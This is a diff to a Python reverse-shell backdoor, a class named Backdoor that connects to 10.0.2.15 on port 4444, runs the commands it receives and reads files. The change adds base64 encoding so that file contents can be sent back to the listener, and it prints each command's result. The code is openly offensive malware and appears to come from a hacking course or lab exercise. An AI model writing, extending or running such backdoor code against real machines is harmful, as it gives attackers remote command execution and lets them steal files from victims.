@@ -1,6 +1,6 @@
 #!/usr/bin/env python
 
-import socket, subprocess, time, json, os
+import socket, subprocess, time, json, os, base64
 
 class Backdoor:
 	def __init__(self, ip, port):
@@ -31,7 +31,7 @@ class Backdoor:
 
 	def read_file(self, path):
 		with open(path, "rb") as file:
-			return file.read()
+			return base64.b64encode(file.read())		# turn unknown into known
 
 # time.sleep(10)
 	def run(self):
@@ -46,6 +46,7 @@ class Backdoor:
 				command_result = self.read_file(command[1])
 			else:
 				command_result = self.execute_system_command(command) 
+			print(command_result)
 			self.reliable_send(command_result)
 		
 my_backdoor = Backdoor("10.0.2.15", 4444)
